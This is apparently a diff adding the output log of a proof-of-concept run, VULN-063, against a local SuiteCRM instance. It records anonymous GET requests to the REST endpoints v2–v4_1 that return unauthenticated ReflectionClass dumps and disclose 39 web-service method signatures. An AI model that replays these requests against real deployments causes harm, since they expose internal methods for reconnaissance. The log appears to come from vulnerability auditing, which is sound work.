@@ -1,0 +1,19 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-063/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-063/../.venv
+========================================================================
+VULN-063: unauthenticated ReflectionClass dump of the web-service implementation
+target: http://localhost:33116
+========================================================================
+[INFO] Brand-new anonymous requests.Session() -- zero credential material
+[STEP] GET http://localhost:33116/service/v4_1/rest.php  (no 'method' param, no session/cookies)
+[INFO] HTTP 200, 41825 bytes returned
+[PROOF] Reflected class = 'SugarWebServiceImplv4_1'; 39 method signatures disclosed (unauthenticated); includes internal/undocumented methods: ['job_queue_cycle', 'job_queue_next', 'job_queue_run', 'oauth_access', 'oauth_access_token', 'oauth_request_token']
+[PROOF] First 400 chars of body: '<pre>/**\n * SugarWebServiceImplv4_1.php\n *\n * This class is an implementation class for all the web services.  Version 4_1 adds limit/off support to the\n * get_relationships function.  We also added the sync_get_modified_relationships function call from version\n * one to facilitate querying for related meetings/calls contacts/users records.\n *\n */\nClass [ <user> class SugarWebServiceImplv4_1 exten'
+[STEP] GET http://localhost:33116/service/v2/rest.php  (no 'method' param, no session/cookies)
+[INFO] sibling v2: HTTP 200, reflection-dump-shaped=True, 29020 bytes
+[STEP] GET http://localhost:33116/service/v3/rest.php  (no 'method' param, no session/cookies)
+[INFO] sibling v3: HTTP 200, reflection-dump-shaped=True, 33960 bytes
+[STEP] GET http://localhost:33116/service/v4/rest.php  (no 'method' param, no session/cookies)
+[INFO] sibling v4: HTTP 200, reflection-dump-shaped=True, 38479 bytes
+[OK] Unauthenticated reflection dump confirmed on v4_1 and siblings=['v2', 'v3', 'v4'] (all leak=True)
+==> VULN-063: CONFIRMED — anonymous GET with empty method= returned a full ReflectionClass dump of SugarWebServiceImplv4_1 (39 methods disclosed, incl. ['job_queue_cycle', 'job_queue_next', 'job_queue_run', 'oauth_access', 'oauth_access_token', 'oauth_request_token']) -- zero authentication
